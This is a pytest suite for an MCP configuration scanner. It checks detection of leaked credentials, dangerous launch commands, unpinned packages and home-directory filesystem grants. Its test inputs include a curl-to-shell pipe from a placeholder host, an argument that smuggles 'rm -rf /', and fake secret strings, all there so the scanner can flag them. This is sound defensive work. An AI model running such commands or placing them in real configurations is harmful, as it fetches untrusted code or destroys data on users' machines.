"""Slice 2 — checks that read the configuration, not the tool surface.

These run at every tier, which is what makes `--no-execute` worth using: a
config file that pipes a remote script into a shell, hands over a home
directory, or carries a live credential is a finding before any server starts.
"""

from __future__ import annotations

import json
from pathlib import Path

from typer.testing import CliRunner

from mcpscan.checks.config_surface import (
    BroadFilesystemGrantCheck,
    DangerousLaunchCommandCheck,
    SecretInConfiguredEnvironmentCheck,
    UnpinnedServerPackageCheck,
)
from mcpscan.checks.registry import active_checks
from mcpscan.cli import app
from mcpscan.models import (
    ContextualVerdict,
    FindingScope,
    PurposeCategory,
    ScanContext,
    ScanTarget,
    Severity,
    TargetKind,
    Transport,
)
from mcpscan.scanner import scan_context
from mcpscan.tiers import ALL_TIERS, EvidenceTier

runner = CliRunner()

SECRET = "AKIAIOSFODNN7EXAMPLE"


def ctx(
    command: list[str] | None = None, env: dict[str, str] | None = None, url: str | None = None
) -> ScanContext:
    target = (
        ScanTarget(kind=TargetKind.URL, transport=Transport.HTTP, url=url, env=env or {})
        if url
        else ScanTarget(
            kind=TargetKind.COMMAND, transport=Transport.STDIO, command=command or [], env=env or {}
        )
    )
    return ScanContext(tier=EvidenceTier.CONFIG, target=target)


# ------------------------------------------------------------ MCP-060 secrets in env


def test_secret_in_env_is_found() -> None:
    findings = SecretInConfiguredEnvironmentCheck().run(ctx(["node", "s.js"], {"AWS_KEY": SECRET}))
    assert len(findings) == 1
    assert findings[0].severity is Severity.CRITICAL
    assert findings[0].target == "env:AWS_KEY"


def test_secret_value_never_appears_in_the_finding() -> None:
    """Not even masked. It is the operator's own credential; printing it helps nobody."""
    finding = SecretInConfiguredEnvironmentCheck().run(ctx(["node", "s.js"], {"AWS_KEY": SECRET}))[
        0
    ]
    blob = json.dumps(finding.model_dump(mode="json"))
    assert SECRET not in blob
    assert SECRET[:8] not in blob
    assert "AWS_KEY" in blob


def test_several_secret_shapes_are_recognised() -> None:
    check = SecretInConfiguredEnvironmentCheck()
    for value in ["ghp_" + "a" * 30, "postgres://u:pw@host/db", "xoxb-" + "1" * 20]:
        assert check.run(ctx(["node", "s.js"], {"K": value})), value


def test_ordinary_env_is_quiet() -> None:
    check = SecretInConfiguredEnvironmentCheck()
    assert (
        check.run(ctx(["node", "s.js"], {"LOG_LEVEL": "debug", "PORT": "3000", "HOME": "/Users/a"}))
        == []
    )


def test_env_findings_are_ordered_for_determinism() -> None:
    findings = SecretInConfiguredEnvironmentCheck().run(
        ctx(["node", "s.js"], {"Z_KEY": SECRET, "A_KEY": SECRET})
    )
    assert [f.target for f in findings] == ["env:A_KEY", "env:Z_KEY"]


# ------------------------------------------------------------ MCP-061 dangerous launch


def test_pipe_to_shell_is_found() -> None:
    findings = DangerousLaunchCommandCheck().run(
        ctx(["sh", "-c", "curl https://x.invalid/i.sh | sh"])
    )
    assert any("pipes it into a shell" in f.evidence for f in findings)
    assert any(f.owasp_mcp == "MCP04" for f in findings)


def test_shell_composition_in_an_argument_is_found() -> None:
    findings = DangerousLaunchCommandCheck().run(ctx(["node", "s.js", "--x=a;rm -rf /"]))
    assert any("more than one command" in f.evidence for f in findings)


def test_sudo_is_found() -> None:
    findings = DangerousLaunchCommandCheck().run(ctx(["sudo", "node", "s.js"]))
    assert any("elevated privileges" in f.evidence for f in findings)


def test_tls_disabling_env_is_found_and_mapped_to_transport() -> None:
    findings = DangerousLaunchCommandCheck().run(
        ctx(["node", "s.js"], {"NODE_TLS_REJECT_UNAUTHORIZED": "0"})
    )
    assert len(findings) == 1
    assert findings[0].owasp_mcp == "MCP07"
    assert findings[0].target == "env:NODE_TLS_REJECT_UNAUTHORIZED"


def test_tls_verification_left_on_is_quiet() -> None:
    assert (
        DangerousLaunchCommandCheck().run(
            ctx(["node", "s.js"], {"NODE_TLS_REJECT_UNAUTHORIZED": "1"})
        )
        == []
    )


def test_an_ordinary_launch_is_quiet() -> None:
    assert DangerousLaunchCommandCheck().run(ctx(["node", "server.js", "--port", "3000"])) == []


# ------------------------------------------------------------ MCP-062 unpinned


def test_unpinned_npx_is_found() -> None:
    findings = UnpinnedServerPackageCheck().run(ctx(["npx", "-y", "thing"]))
    assert len(findings) == 1
    assert "no version" in findings[0].evidence


def test_floating_tag_is_found() -> None:
    assert UnpinnedServerPackageCheck().run(ctx(["npx", "thing@latest"]))


def test_pinned_versions_are_quiet() -> None:
    check = UnpinnedServerPackageCheck()
    assert check.run(ctx(["npx", "thing@1.2.3"])) == []
    assert check.run(ctx(["npx", "@scope/thing@2.0.0"])) == []
    assert check.run(ctx(["uvx", "pkg@0.1.0"])) == []


def test_vcs_specifier_is_found() -> None:
    findings = UnpinnedServerPackageCheck().run(ctx(["uvx", "git+https://x.invalid/r.git"]))
    assert "version-control" in findings[0].evidence


def test_two_word_runners_are_understood() -> None:
    assert UnpinnedServerPackageCheck().run(ctx(["pipx", "run", "thing"]))
    assert UnpinnedServerPackageCheck().run(ctx(["uv", "tool", "run", "thing"]))


def test_a_direct_launch_is_not_a_package_runner() -> None:
    check = UnpinnedServerPackageCheck()
    assert check.run(ctx(["node", "server.js"])) == []
    assert check.run(ctx(["/usr/bin/python3", "server.py"])) == []


def test_runner_path_and_exe_suffix_are_handled() -> None:
    # Windows configs name npx.exe, and some name it by absolute path.
    assert UnpinnedServerPackageCheck().run(ctx(["C:\\Program Files\\nodejs\\npx.exe", "thing"]))
    assert UnpinnedServerPackageCheck().run(ctx(["/opt/homebrew/bin/npx", "thing"]))


# ------------------------------------------------------------ MCP-063 broad paths


def test_filesystem_root_is_found() -> None:
    findings = BroadFilesystemGrantCheck().run(ctx(["npx", "fs@1.0.0", "/"]))
    assert findings[0].severity is Severity.HIGH


def test_home_directory_shapes_are_found() -> None:
    check = BroadFilesystemGrantCheck()
    for path in ["~", "$HOME", "${HOME}", "%USERPROFILE%", "/Users/alice", "/home/bob"]:
        assert check.run(ctx(["npx", "fs@1.0.0", path])), path


def test_windows_drive_roots_are_found() -> None:
    check = BroadFilesystemGrantCheck()
    for path in ["C:\\", "C:\\Users", "D:/", "C:"]:
        assert check.run(ctx(["npx", "fs@1.0.0", path])), path


def test_a_project_directory_is_quiet() -> None:
    check = BroadFilesystemGrantCheck()
    for path in [
        "./project",
        "/Users/alice/code/thing",
        "/home/bob/src",
        "--root",
        "relative/path",
    ]:
        assert check.run(ctx(["npx", "fs@1.0.0", path])) == [], path


# ------------------------------------------------------------ tier and adjudication


def test_all_four_run_at_every_tier() -> None:
    for check in (
        SecretInConfiguredEnvironmentCheck(),
        DangerousLaunchCommandCheck(),
        UnpinnedServerPackageCheck(),
        BroadFilesystemGrantCheck(),
    ):
        assert check.requires == ALL_TIERS, check.id
        assert check.scope is FindingScope.CONFIGURATION, check.id


def test_config_findings_are_not_adjudicated_by_purpose() -> None:
    """A declared purpose cannot excuse a credential in the environment.

    Nor should it escalate an unpinned package as a "hidden capability" —
    which is what happened before FindingScope existed, because no purpose
    lists "unpinned package" among its expected capabilities.
    """
    result = scan_context(
        ctx(["npx", "-y", "fs-server", "/Users/alice"], {"AWS_KEY": SECRET}),
        purpose_category=PurposeCategory.FILESYSTEM,
    )
    config_findings = [f for f in result.findings if f.scope is FindingScope.CONFIGURATION]
    assert config_findings
    for finding in config_findings:
        assert finding.contextual_verdict is ContextualVerdict.UNADJUDICATED
        assert finding.adjusted_severity == finding.original_severity


def test_they_are_in_the_active_registry() -> None:
    ids = {check.id for check in active_checks()}
    assert {"MCP-060", "MCP-061", "MCP-062", "MCP-063"} <= ids


# ------------------------------------------------------------ end to end, no execution


def _config(tmp_path: Path) -> Path:
    path = tmp_path / "mcp.json"
    path.write_text(
        json.dumps(
            {
                "mcpServers": {
                    "fs": {
                        "command": "npx",
                        "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/alice"],
                    },
                    "leaky": {
                        "command": "node",
                        "args": ["s.js"],
                        "env": {"AWS_ACCESS_KEY_ID": SECRET},
                    },
                    "remote": {"url": "http://internal.invalid/mcp"},
                }
            }
        ),
        encoding="utf-8",
    )
    return path


def test_scan_config_no_execute_finds_all_four_classes(tmp_path: Path) -> None:
    out = runner.invoke(
        app, ["scan-config", str(_config(tmp_path)), "--no-execute", "--output", "json"]
    )
    payload = json.loads(out.stdout)
    ids = {f["id"] for server in payload["server_results"] for f in server["findings"]}
    assert {"MCP-060", "MCP-062", "MCP-063", "MCP-041"} <= ids


def test_scan_config_no_execute_never_leaks_an_env_value(tmp_path: Path) -> None:
    out = runner.invoke(
        app, ["scan-config", str(_config(tmp_path)), "--no-execute", "--output", "json"]
    )
    assert SECRET not in out.stdout
    assert "AWS_ACCESS_KEY_ID" in out.stdout


def test_scan_config_sarif_is_valid_and_reports_not_run(tmp_path: Path) -> None:
    out = runner.invoke(
        app, ["scan-config", str(_config(tmp_path)), "--no-execute", "--output", "sarif"]
    )
    assert out.exit_code in {0, 1}, out.output
    payload = json.loads(out.stdout)
    assert payload["version"] == "2.1.0"
    run = payload["runs"][0]
    assert run["results"]
    # `invocations`, plural: SARIF 2.1.0 has no singular member, and the first
    # version of this reporter wrote notifications where no consumer looks.
    assert run["invocations"][0]["toolExecutionNotifications"], (
        "not-run checks must be visible in SARIF"
    )
    assert run["invocations"][0]["properties"]["evidence_tiers"] == ["config"]


def test_sarif_never_carries_a_snippet(tmp_path: Path) -> None:
    """SARIF regions may hold server-supplied text; payload_stored=false forbids it."""
    out = runner.invoke(
        app, ["scan-config", str(_config(tmp_path)), "--no-execute", "--output", "sarif"]
    )
    assert "snippet" not in out.stdout
    assert SECRET not in out.stdout


def test_config_tier_results_are_deterministic(tmp_path: Path) -> None:
    config = _config(tmp_path)

    def body() -> str:
        out = runner.invoke(app, ["scan-config", str(config), "--no-execute", "--output", "sarif"])
        return out.stdout

    assert body() == body()


# ------------------------------------------------------------ MCP-062 remediation


def _finding(command: list[str]):
    findings = UnpinnedServerPackageCheck().run(ctx(command))
    assert findings, f"expected a finding for {command}"
    return findings[0]


def test_remediation_shows_the_pinned_form_of_this_command() -> None:
    """ "Pin it" without the syntax is a remediation people skip."""
    finding = _finding(["npx", "-y", "@modelcontextprotocol/server-filesystem", "/tmp/x"])
    assert finding.metadata["pinned_form"] == (
        "npx -y @modelcontextprotocol/server-filesystem@<version> /tmp/x"
    )
    assert finding.metadata["pinned_form"] in finding.remediation


def test_the_pinned_form_uses_each_runners_own_syntax() -> None:
    assert _finding(["npx", "thing"]).metadata["pinned_form"] == "npx thing@<version>"
    assert _finding(["uvx", "thing"]).metadata["pinned_form"] == "uvx thing==<version>"
    assert _finding(["pipx", "run", "thing"]).metadata["pinned_form"] == "pipx run thing==<version>"
    assert _finding(["bunx", "thing"]).metadata["pinned_form"] == "bunx thing@<version>"


def test_multi_word_runners_pin_the_package_not_the_subcommand() -> None:
    """`uv tool` was listed as the prefix for `uv tool run pkg`, so the check
    flagged `run` as the unpinned specifier and suggested pinning it."""
    finding = _finding(["uv", "tool", "run", "other-tool"])
    assert finding.target == "other-tool"
    assert finding.metadata["pinned_form"] == "uv tool run other-tool==<version>"


def test_an_existing_version_or_range_is_replaced_not_appended() -> None:
    assert _finding(["uvx", "pkg>=2.0"]).metadata["pinned_form"] == "uvx pkg==<version>"
    assert _finding(["uvx", "pkg~=1.0"]).metadata["pinned_form"] == "uvx pkg==<version>"
    assert _finding(["npx", "thing@latest"]).metadata["pinned_form"] == "npx thing@<version>"


def test_scoped_npm_names_keep_their_leading_at() -> None:
    assert _finding(["npx", "@scope/name@latest"]).metadata["pinned_form"] == (
        "npx @scope/name@<version>"
    )


def test_pip_style_pins_are_recognised_as_pinned() -> None:
    """uv and pipx take `name==version`; only understanding npm's `@` form
    made every correctly pinned uv launch a false positive."""
    check = UnpinnedServerPackageCheck()
    assert check.run(ctx(["uvx", "pkg==2.3.4"])) == []
    assert check.run(ctx(["uv", "tool", "run", "pkg==1.0"])) == []
    # A range still floats, so it is still reported.
    assert check.run(ctx(["uvx", "pkg>=2.0"]))


def test_a_vcs_specifier_is_pinned_to_a_commit() -> None:
    finding = _finding(["uvx", "git+https://x.invalid/r.git"])
    assert "<commit-sha>" in finding.metadata["pinned_form"]


def test_the_finding_explains_why_unpinned_enables_a_rug_pull() -> None:
    finding = _finding(["npx", "thing"])
    assert "rug pull" in finding.evidence
    assert "fetched fresh at every launch" in finding.evidence
    assert "audited" in finding.evidence and "run are not necessarily the same" in finding.evidence


def test_the_remediation_points_at_snapshot_and_drift() -> None:
    finding = _finding(["npx", "thing"])
    assert "mcpscan snapshot" in finding.remediation
    assert "mcpscan drift" in finding.remediation


def test_the_remediation_does_not_oversell_pinning() -> None:
    """Pinning narrows the window; it does not close it. Saying otherwise
    would be the overstatement this project exists not to make."""
    finding = _finding(["npx", "thing"])
    assert "does not close it" in finding.remediation
    assert "republished" in finding.remediation
